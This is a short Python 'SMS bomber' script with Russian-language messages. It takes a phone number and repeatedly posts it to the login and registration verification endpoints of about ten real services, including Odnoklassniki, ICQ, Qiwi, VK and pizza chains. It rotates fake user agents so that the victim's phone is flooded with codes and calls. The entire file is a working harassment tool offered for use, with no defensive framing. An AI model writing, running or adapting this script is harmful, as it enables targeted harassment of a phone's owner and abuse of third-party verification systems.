import requests
import fake_useragent
import time
number = input('Введите номер телефона = ')

while True:
    user = fake_useragent.UserAgent().random
    headers = {'user_agent': user}
    try:
        response = requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', headers=headers, data={'st.r.phone': '+' + number})
        print('СМС с Одноклассников отправлено')
    except SystemError:
        print('СМС с Одноклассников не отправило')
    try:
        response = requests.post('https://icq.com/smscode/login/ru', headers=headers, data={'msisdn': number})
        print('СМС с ICQ отправлено')
    except SystemError:
        print('СМС с ICQ не отправило')
    try:
        response = requests.post('https://dodopizza.by/api/sendconfirmationcode', headers=headers, data={'phoneNumber': '+' + number})
        print('СМС с Додо Пицца отправлено')
    except SystemError:
        print('СМС с Додо Пицца не отправило')
    try:
        response = requests.post('https://b.utair.ru/api/v1/login/', headers=headers, data={'login': '+' + number})
        print('Звонок с Utair отправлено')
    except SystemError:
        print('Звонок с Utair не отправило')
    try:
        response = requests.post('https://koronapay.com/transfers/online/api/users/otps', headers=headers, data={'phone': number})
        print('СМС с КоронаПэй отправлено')
    except SystemError:
        print('СМС с КоронаПэй не отправило')
    try:
        response = requests.post('https://api.vk.com/method/auth.validatePhone?v=5.148&client_id=7733222', headers=headers, data={'phone': '+' + number})
        print('СМС с Youla отправлено')
    except SystemError:
        print('СМС с Youla не отправило')
    try:
        response = requests.post('https://qiwi.com/oauth/authorize', headers=headers, data={'username': '+' + number})
        print('СМС с Киви отправлено')
    except SystemError:
        print('СМС с Киви не отправило')
    try:
        response = requests.post('https://api.iconjob.co/api/auth/verification_code', headers=headers, json={'phone': number})
        print('СМС с Worki отправлено')
    except SystemError:
        print('СМС с Worki не отправило')
    try:
        response = requests.post('https://delivio.by/be/api/register', headers=headers, json={'phone': '+' + number})
        print('СМС с Delivio отправлено')
    except SystemError:
        print('СМС с Delivio не отправило')
    try:
        response = requests.post('https://nasha-pizza.by/', headers=headers, data={'phone': number})
        print('СМС с Nasha-Pizza отправлено')
    except SystemError:
        print('СМС с Nasha-Pizza не отправило')
    time.sleep(1)
    input()
